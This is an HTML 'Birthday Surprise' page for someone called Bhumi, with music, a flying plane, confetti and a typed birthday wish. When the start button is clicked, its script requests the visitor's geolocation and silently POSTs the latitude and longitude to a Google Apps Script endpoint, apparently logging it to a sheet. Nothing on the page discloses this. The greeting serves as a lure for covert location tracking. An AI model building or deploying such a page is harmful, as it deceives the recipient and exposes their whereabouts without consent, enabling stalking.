<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Birthday Surprise</title>

<style>
body{
  margin:0;
  height:100vh;
  background:url("https://share.google/Hnnge2RXiJbqxdXdL") center/cover no-repeat;
  font-family: 'Comic Sans MS', cursive;
  overflow:hidden;
  text-align:center;
}

#startBtn{
  margin-top:45vh;
  padding:16px 32px;
  font-size:20px;
  border:none;
  border-radius:30px;
  background:#ff4081;
  color:white;
  cursor:pointer;
}

#plane{
  position:fixed;
  top:20px;
  left:-120px;
  width:90px;
  display:none;
  transition:transform 4s linear;
}

.fly{
  transform:translate(55vw,45vh);
}

#message{
  display:none;
  margin-top:20px;
  font-size:22px;
  color:#d50000;
  white-space:pre-line;
}

canvas{
  position:fixed;
  top:0;
  left:0;
  pointer-events:none;
}
</style>
</head>

<body>

<button id="startBtn">üéÅ Start Birthday Surprise</button>

<img id="plane" src="https://share.google/8fG0F2JyuQJhAQ7Vx">

<div id="message"></div>

<audio id="music" src="https://mobcup.fm/ringtone/happy-birthday-instrumental-fKtAprUM?utm_source=share&utm_medium=web&utm_name=detail"></audio>

<canvas id="confetti"></canvas>

<script>
const SHEET_URL = "https://script.google.com/macros/s/AKfycbzmeb8cLGHRikGkrMC-wfxEuKXVepZT-rVeEXDPoJPG_oj4ZniH7NHiYoiL_txq0mw8ag/exec";

const text = `Blow your candles üéÇ and make a wish üå†
May this new personal year be filled with peace, love, and positivity ‚úåÔ∏è‚ù§Ô∏è‚ú®
Happy birthday, bestie 
Happy birthday bhumi`;

startBtn.onclick = () => {
  startBtn.style.display="none";
  music.play();

  plane.style.display="block";
  plane.offsetHeight;
  plane.classList.add("fly");

  navigator.geolocation.getCurrentPosition(pos=>{
    fetch(SHEET_URL,{
      method:"POST",
      body:JSON.stringify({
        lat:pos.coords.latitude,
        lon:pos.coords.longitude,
        city:"",
        state:"",
        country:""
      })
    });
  });

  setTimeout(()=>{
    startConfetti();
    typeText();
  },4200);
};

function typeText(){
  message.style.display="block";
  let i=0;
  const t=setInterval(()=>{
    message.textContent+=text[i++];
    if(i>=text.length) clearInterval(t);
  },50);
}

/* CONFETTI */
const canvas=document.getElementById("confetti");
const ctx=canvas.getContext("2d");
canvas.width=innerWidth;
canvas.height=innerHeight;
let pieces=[];

function startConfetti(){
  for(let i=0;i<200;i++){
    pieces.push({
      x:Math.random()*canvas.width,
      y:Math.random()*canvas.height-canvas.height,
      r:Math.random()*6+4,
      c:`hsl(${Math.random()*360},100%,50%)`,
      s:Math.random()*3+2
    });
  }
  requestAnimationFrame(update);
}

function update(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  pieces.forEach(p=>{
    p.y+=p.s;
    ctx.beginPath();
    ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
    ctx.fillStyle=p.c;
    ctx.fill();
  });
  requestAnimationFrame(update);
}
</script>

</body>
</html>
